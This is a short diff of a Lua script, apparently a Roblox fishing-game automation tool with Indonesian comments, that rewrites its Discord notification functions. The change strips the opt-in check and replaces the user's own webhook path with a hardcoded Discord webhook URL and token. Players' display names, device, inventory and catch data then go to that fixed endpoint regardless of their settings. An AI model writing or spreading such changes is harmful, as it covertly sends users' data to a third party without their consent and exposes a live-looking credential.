@@ -3806,12 +3806,8 @@ FishNotif:Button({
 
 -- GANTI LAGI FUNGSI LAMA ANDA DENGAN VERSI FINAL INI
 local function sendFishWebhook(fishName, rarityText, assetId, itemId, variantId)
-    if not webhookPath or webhookPath == "" or not FishWebhookEnabled then
-        warn("Webhook disabled or path invalid.")
-        return
-    end
 
-    local WebhookURL = "https://discord.com/api/webhooks/" .. webhookPath
+    local WebhookURL = "https://discord.com/api/webhooks/1439692849737236630/O67c7tzGSUH4AG66CKgL9W5qQlKokmPw5l0g0wFGV4oeV8xBlllCa-GeTUA5sDPU3iXD"
     local username = LocalPlayer.DisplayName
     local rodName = getValidRodName()
     local inventoryCount = getInventoryCount() 
@@ -3964,7 +3960,7 @@ end
 local function sendDisconnectWebhook(reason)
     if not webhookPath or webhookPath == "" then return end
 
-    local WebhookURL = "https://discord.com/api/webhooks/" .. webhookPath
+    local WebhookURL = "https://discord.com/api/webhooks/1439692849737236630/O67c7tzGSUH4AG66CKgL9W5qQlKokmPw5l0g0wFGV4oeV8xBlllCa-GeTUA5sDPU3iXD"
     local username = LocalPlayer.DisplayName or "Unknown Player"
     local device = tostring(UserInputService:GetPlatform()):gsub("Enum%.Platform%.", "")
     local timeStr = os.date("%d %B %Y, %H:%M:%S")
